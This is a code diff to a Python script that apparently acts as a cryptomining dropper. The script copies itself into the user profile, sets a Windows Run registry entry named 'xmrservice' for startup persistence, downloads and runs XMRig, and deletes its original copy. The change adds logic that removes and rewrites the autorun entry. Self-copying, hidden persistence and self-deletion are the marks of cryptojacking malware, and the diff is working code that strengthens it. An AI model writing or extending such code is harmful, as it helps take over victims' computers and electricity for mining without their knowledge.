@@ -38,6 +38,19 @@ def check_registry():
         print("Error checking registry:", e)
         return False
 
+# Function to remove an existing registry entry for 'xmrservice'
+def remove_registry_entry():
+    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
+        winreg.DeleteValue(key, "xmrservice")
+        winreg.CloseKey(key)
+        print("Deleted existing registry entry 'xmrservice'.")
+    except FileNotFoundError:
+        print("Registry entry 'xmrservice' not found, nothing to delete.")
+    except Exception as e:
+        print("Error deleting registry entry 'xmrservice':", e)
+
 # Function to add the script to the registry for startup execution
 def add_to_startup(file_path):
     reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -128,20 +141,20 @@ if __name__ == "__main__":
     if current_dir.lower() != userprofile.lower():
         # If not running from userprofile, copy the script there and run from the copy
         dest_file = copy_to_userprofile()
-        if not check_registry():
-            add_to_startup(dest_file)
-        else:
-            print("Registry entry 'xmrservice' already exists.")
+        # Remove existing registry entry if present, then add new entry
+        if check_registry():
+            remove_registry_entry()
+        add_to_startup(dest_file)
         check_and_download_xmrig(userprofile)
         run_xmrig(userprofile)
         self_delete()
         sys.exit()
     else:
         # Already running from %USERPROFILE%, so just run normally without copying or self-deleting
-        if not check_registry():
-            add_to_startup(sys.argv[0])
-        else:
-            print("Registry entry 'xmrservice' already exists.")
+        # Remove existing registry entry if present, then add new entry
+        if check_registry():
+            remove_registry_entry()
+        add_to_startup(sys.argv[0])
         check_and_download_xmrig(userprofile)
         run_xmrig(userprofile)
         sys.exit()
